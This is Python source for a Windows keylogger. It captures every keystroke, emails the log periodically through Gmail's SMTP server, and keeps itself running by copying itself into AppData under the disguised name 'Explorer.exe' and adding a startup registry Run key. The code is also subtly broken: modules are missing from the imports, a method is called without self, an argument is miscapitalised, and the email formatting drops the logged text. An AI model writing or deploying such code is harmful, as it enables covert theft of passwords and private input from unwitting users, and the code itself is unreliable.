import pynput.keyboard
import smtplib
import threading
import os
import shutil


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.logger = "[Keylogger Initiated]"
        self.subject = "Keylogger Report Email"
        self.email = "email"
        self.password = "password"
        self.interval = time_interval

    def append_to_log(self, key_strike):
        self.logger = self.logger + key_strike

    def evaluate_keys(self, key):
        try:
            Pressed_key = str(key.char)
        except AttributeError:
           if key == key.space:
                Pressed_key = " "
           else:
                Pressed_key = " " + str(key) + " "

        self.append_to_log(Pressed_key)

    def report(self):
        #send the email of what has been logged
        self.send_email(self.email, self.password, self.subject, self.logger)
        self.logger = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_email(self, email, password, subject, message):
        Email_message = 'Subject: {}\n\n'.format(subject, message)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, Email_message)
        server.quit()

    def add_registry(self):
        #program to registry so that it runs on startup
        keylogger_location = os.environ["appdata"] + "\\Explorer.exe"
        if not os.path.exists(keylogger_location):
            shutil.copyfile(sys.executable, keylogger_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v explorer /t REG_SZ /d "' + keylogger_location + '"', Shell=True)

    def start(self):
        add_registry()
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
            